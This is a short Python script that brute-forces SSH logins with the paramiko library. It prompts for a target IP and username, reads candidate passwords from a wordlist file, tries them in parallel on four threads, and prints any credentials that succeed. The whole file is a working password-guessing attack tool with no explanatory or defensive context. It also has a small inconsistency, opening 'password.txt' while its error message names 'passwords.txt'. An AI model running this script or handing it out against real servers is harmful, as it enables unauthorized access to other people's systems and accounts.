try:
    import paramiko
    from concurrent.futures import ThreadPoolExecutor
except Exception as e:
    print(f"[!] Import error: {e}")

def ssh_bruteforce(host, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password, timeout=3)
        print(f"[+] Success: {username}:{password}")
        client.close()
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}:{password}")
    except Exception as e:
        print(f"[!] Error: {e}")

def get_user_input():
    username = input("Input your username: ")
    ip = input("Input your IP address: ")
    response = input("Do you want to continue [Y/n]: ")
    if response.lower() != 'y':
        print("Aborted by user.")
        exit()
    return ip, username

def main():
    ip, username = get_user_input()

    try:
        with open('password.txt', 'r') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print("[!] passwords.txt not found.")
        return

    def work(password):
        ssh_bruteforce(ip, username, password)

    with ThreadPoolExecutor(max_workers=4) as exe:
        for password in passwords:
            exe.submit(work, password)

if __name__ == "__main__":
    main()
